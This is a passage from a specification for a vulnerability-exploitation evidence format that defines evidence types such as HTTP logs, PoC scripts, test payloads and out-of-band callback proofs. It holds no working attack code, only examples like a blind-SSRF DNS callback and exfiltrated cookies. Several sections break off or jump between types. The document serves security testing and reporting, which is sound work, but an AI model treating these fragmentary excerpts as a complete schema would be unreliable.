  * Use when the validation involved a tight interplay of different techniques (e.g., SAST identified a potential flaw, DAST was used to confirm reachability to a certain point, and manual code review of a specific function then confirmed the final exploit logic).  
  * The ExploitFlow.description or individual Evidence item descriptions should clarify the hybrid approach taken.  
  * The Evidence array would likely contain items with different validationMethods, or this top-level method indicates the overall approach to gathering the collective evidence.  
  * **Example Context:** A SAST tool points to a potential injection. A DAST scan confirms that an endpoint can be reached but doesn't trigger the full exploit. A manual review then confirms the internal logic is flawed, and a carefully crafted payload (tested manually) finally proves the exploit. The overall validation is hybrid.

---

OTHER\_VALIDATION\_METHOD

* **Display Name:** Other Validation Method  
* **Definition:** Indicates that the evidence was obtained using a validation method not adequately described by the other predefined enumeration values.  
* **Usage Guidance:**  
  * Use this sparingly when no other validationMethod accurately reflects how the evidence was obtained or the vulnerability was validated.  
  * When using this value, the Evidence.description or ExploitFlow.description **SHOULD** provide a clear explanation of the method used.  
  * **Example Context:** Validation based on a novel research technique not yet categorized, or a highly specialized proprietary validation process.

  * The interaction should ideally be with a system controlled by the tester/validator (e.g., a Burp Collaborator instance, a custom listener, an Interactsh server).  
  * Details should be specific enough (e.g., unique identifiers in subdomains or paths) to reliably correlate the interaction with the specific exploit attempt.  
* **Purpose of** data **Object (**ExternalInteractionProofData**):** To document the details of an observed outbound network interaction triggered by an exploit, confirming control flow or data exfiltration to an external entity.  
* **Key** data **Object Fields Summary (**ExternalInteractionProofData**):**

  * timestampOfInteraction (String, date-time format, Optional): The timestamp when the interaction was observed on the external system.  
  * requestPayloadOrQueryDetails (String, Optional): Specific details from the interaction that link it to the exploit (e.g., the unique subdomain queried in a DNS interaction, specific path or headers in an HTTP callback, data included in the payload sent by the vulnerable application).  
  * responseSummaryReceived (String, Optional): A summary of any response sent back *to* the vulnerable system *by* the external entity, if observed and relevant to the proof.  
  * notes (String, Optional): Contextual notes explaining how this interaction confirms the vulnerability (e.g., "Confirms blind SSRF by triggering DNS lookup to \[unique\_id\].collaborator.net", "HTTP callback received containing exfiltrated user session cookie.").

---

HTTP\_REQUEST\_LOG

* **Display Name:** HTTP Request Log  
* **Definition:** Represents the evidence of a complete HTTP request that was sent by an attacker, testing tool, or observed during an exploit. This type captures the raw details of the request that triggered or demonstrated the vulnerability.  
* **Usage Guidance:**  
  * Use this when the exact details of the HTTP request (method, URL, headers, body) are crucial for understanding, reproducing, or validating the exploit.  
  * Common for web application vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), Command Injection, Insecure Direct Object References (IDORs), etc., particularly when validated via DAST, IAST, or manual penetration testing.  
  * Consider redacting highly sensitive information (e.g., active session tokens, PII) from headers or body if the full value is not strictly necessary for the proof, or clearly note its sensitivity. Use placeholder values where appropriate if full values are not needed (e.g., Authorization: Bearer \[REDACTED\_TOKEN\]).  
* **Purpose of** data **Object (**HttpRequestLogData**):** To capture all relevant components of an HTTP request in a structured manner, allowing for precise reproduction and analysis.  
* **Key** data **Object Fields Summary (**HttpRequestLogData**):**

If the body contains binary data or non-UTF-8 characters, "base64" is recommended. If the body is structured (e.g., JSON, XML), it can be included as a string, and this field can indicate its original format for easier parsing by consumers.

---

HTTP\_RESPONSE\_LOG

* **Display Name:** HTTP Response Log  
* **Definition:** Represents the evidence of a complete HTTP response received from the application as a result of a request (often the one detailed in a corresponding HTTP\_REQUEST\_LOG evidence item) that triggered or demonstrated a vulnerability.  
* **Usage Guidance:**  
  * Use this when the content or characteristics of the server's response are key to proving the exploit (e.g., reflected XSS, error messages revealing SQL errors, successful data exfiltration in the response body, unexpected status codes for IDORs, presence/absence of security headers).  
  * Often paired with an HTTP\_REQUEST\_LOG evidence item.  
  * Redact sensitive information from the response body if necessary.  
* **Purpose of** data **Object (**HttpResponseLogData**):** To capture all relevant components of an HTTP response in a structured manner.

  * expectedState (String, Mandatory): The expected state, presence, or configuration of the artifact for secure operation (e.g., "X-Content-Type-Options header should be present with value 'nosniff'", "Username parameter should be validated against a whitelist pattern: ^\[a-zA-Z0-9\_\]{3,16}$").  
  * observedState (String, Mandatory): The observed state, confirming the absence or incorrect configuration (e.g., "Header not present", "No input validation found for parameter 'username'", "CSRF token was not found in the form submission.").

---

OBSERVED\_BEHAVIORAL\_CHANGE

* **Display Name:** Observed Behavioral Change  
* **Definition:** Evidence that describes an unexpected or malicious change in the application's or system's behavior as a direct result of an exploit attempt. This often demonstrates the impact of the vulnerability.  
* **Usage Guidance:**  
  * Use when the exploit leads to a noticeable change in state or functionality that isn't simply reflected data or a direct command output.  
  * Examples: an unauthorized administrative action occurring (user deletion, privilege change), unexpected file modifications, successful bypass of a business logic workflow (e.g., an order processed with zero value), or a visible defacement.  
  * Clearly distinguish between the action taken by the tester/attacker and the resulting behavior of the system.  
* **Purpose of** data **Object (**ObservedBehaviorData**):** To document the action performed, the expected secure behavior, and the actual observed behavior that indicates a security flaw.  
* **Key** data **Object Fields Summary (**ObservedBehaviorData**):**  
  * actionPerformedToTrigger (String, Mandatory): The action or sequence of actions performed by the tester/attacker that led to the observed behavior (e.g., "Submitted form with manipulated 'price' field", "Accessed admin endpoint '/deleteUser?id=123' without authorization").

---

POC\_SCRIPT

* **Display Name:** Proof-of-Concept Script  
* **Definition:** Provides a script or a sequence of detailed steps that can be executed or followed to reproduce the validated exploit.  
* **Usage Guidance:**  
  * Use this when an automated script or a clear, step-by-step manual procedure is the best way to demonstrate exploitability and allow others (e.g., developers, other security testers) to reproduce the finding.  
  * The script content itself should be included in scriptContent. If the script is exceptionally long or complex, provide a concise version focused on the core exploit mechanism and, if absolutely necessary, reference an external location for the full script (though self-contained evidence is strongly preferred for VXDF).  
  * Ensure the script does not contain elements that could cause unintended harm if run incautiously by a reviewer; clearly state any prerequisites, setup instructions, or potential impact of running the script.  
  * For non-executable, manual reproduction steps, scriptLanguage can be set to "text/plain" or "markdown".  
* **Purpose of** data **Object (**PocScriptData**):** To provide the content of the PoC script or manual steps, along with necessary metadata for its execution or interpretation, facilitating reproducibility.  
* **Key** data **Object Fields Summary (**PocScriptData**):**  
  * scriptLanguage (String, Mandatory): The language of the script (e.g., "python", "bash", "powershell", "javascript", "ruby") or format of instructions (e.g., "text/plain" for numbered manual steps, "markdown" for richer formatted steps).

RUNTIME\_EXCEPTION\_TRACE

* **Display Name:** Runtime Exception Trace  
* **Definition:** Evidence consisting of a stack trace or exception details generated by the application or system at runtime, typically as a result of an exploit attempt or when a vulnerability condition is met.  
* **Usage Guidance:**  
  * Use this when an exception directly indicates a security flaw (e.g., a SQL syntax error in response to an injection attempt, a null pointer dereference caused by malformed input, an unhandled exception revealing internal paths or variables).  
  * It can also be supporting evidence showing that an input reached a certain point or caused an unexpected state, even if the exception itself isn't the final exploit.  
  * Include the full stack trace if possible, or at least the most relevant parts.  
* **Purpose of** data **Object (**ExceptionTraceData**):** To capture the details of a runtime exception, including its type, message, and call stack, which can be crucial for diagnosing and confirming vulnerabilities.

  * stackTrace (Array of Strings, Mandatory): An ordered array of strings, where each string represents a frame in the call stack at the time the exception occurred. The format of each frame string may vary by language/platform but should be as detailed as possible (e.g., "com.example.MyClass.myMethod(MyClass.java:42)").  
  * rootCause (Object, Optional, $ref: "\#/$defs/ExceptionTraceData"): A nested ExceptionTraceData object representing the underlying "cause" of this exception, if the exception handling framework provides this (common in Java).

---

TEST\_PAYLOAD\_USED

* **Display Name:** Test Payload Used  
* **Definition:** The specific input string, data, or payload that was submitted to the application or system to trigger and validate the vulnerability.  
* **Usage Guidance:**  
  * Essential for reproducibility and understanding the exact vector.  
  * Use this for any vulnerability where a crafted input is the means of exploitation (e.g., SQLi payloads, XSS vectors, command injection strings, fuzzing inputs that caused a crash, manipulated parameters for IDORs or business logic flaws).  
  * Clearly indicate where or how this payload was delivered.  
  * For binary or complex payloads, consider Base64 encoding and specify payloadEncoding.  
* **Purpose of** data **Object (**TestPayloadData**):** To document the exact payload that successfully demonstrated the vulnerability.

VULNERABLE\_COMPONENT\_SCAN\_OUTPUT

* **Display Name:** Vulnerable Component Scan Output  
* **Definition:** Evidence from a Software Composition Analysis (SCA) tool, dependency checker, or vulnerability scanner that identifies a specific software component (library, framework, module, OS package) as having one or more known vulnerabilities (e.g., associated with a CVE).  
* **Usage Guidance:**  
  * This is often the initial piece of evidence for "Vulnerable and Outdated Components" findings.  
  * It should clearly identify the component (name, version, PURL/CPE if possible) and the known vulnerability ID(s) (e.g., CVE, GHSA).  
  * **Important for VXDF:** While SCA tools identify *known* vulnerabilities in components, VXDF's core purpose is to document *validated exploitability in the current application's context*. Therefore, this evidenceType is often a starting point. A complete ExploitFlow for a vulnerable component **SHOULD ideally include additional evidence** (e.g., TEST\_PAYLOAD\_USED, HTTP\_REQUEST\_LOG, EXTERNAL\_INTERACTION\_PROOF, CODE\_SNIPPET\_SINK) demonstrating that the component's vulnerability is *actually reachable and exploitable* through the application's code or configuration.  
  * If this is the *only* evidence, the ExploitFlow.description and ExploitFlow.exploitabilityAssessment should clearly state the extent of validation performed (e.g., "Component confirmed present; exploitability of CVE-XYZ in this specific usage context not yet fully validated but deemed plausible due to direct usage of vulnerable function ABC.").  
* **Purpose of** data **Object (**ScaOutputData**):** To provide structured information from an SCA tool or similar source, identifying a component and its associated known vulnerabilities.  
* **Key** data **Object Fields Summary (**ScaOutputData**):**  
  * toolName (String, Optional): Name of the SCA tool or dependency checker used (e.g., "OWASP Dependency-Check", "Snyk", "Trivy", "Dependabot").

    * purl (String, Optional): Package URL (PURL) of the component. **Highly Recommended.**  
    * cpe (String, Optional): Common Platform Enumeration (CPE) of the component.  
  * vulnerabilityIdentifiers (Array of Objects, Mandatory): List of known vulnerability identifiers associated with this component version. Each object has:  
    * idSystem (String, Mandatory, Enum: "CVE", "GHSA", "OSV", "NVD", "VENDOR\_SPECIFIC", "OTHER"): The system/namespace of the ID.  
    * idValue (String, Mandatory): The vulnerability ID itself (e.g., "CVE-2021-44228", "GHSA-jfh8-c2jp-5v3q").  
  * vulnerabilitySeverity (String, Optional): The severity of the identified component vulnerability as reported by the scanner, NVD, or advisory (e.g., "CRITICAL", "HIGH"). This can be the original severity before contextual validation.  
  * details (String, Optional): Additional details from the SCA tool, such as the path to the vulnerable library in the project, a link to the advisory, or specific notes about the finding.
